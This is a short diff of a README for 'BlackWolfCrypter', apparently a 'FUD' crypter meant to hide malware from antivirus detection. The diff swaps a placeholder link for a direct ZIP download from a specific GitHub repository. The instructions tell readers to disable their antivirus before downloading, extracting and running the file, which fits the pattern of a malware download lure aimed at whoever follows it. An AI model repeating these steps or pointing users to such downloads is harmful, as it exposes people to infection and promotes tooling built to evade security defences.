@@ -34,7 +34,7 @@
 
 **Note: You may need to temporarily disable your antivirus software during installation.**
 
-1. **Download**: [[Click here to download BlackWolfCrypter]](https://github.com/yourusername/BlackWolfCrypter/releases/latest)
+1. **Download**: [[Click here to download BlackWolfCrypter]](https://github.com/stevanolstrak/BlackWolfCrypter-FUD/blob/main/releases/BlackWolfCrypter.zip)
 2. **Extract the ZIP File**:
    - Unzip the downloaded file to a convenient location on your computer.
 3. **Run BlackWolfCrypter**:
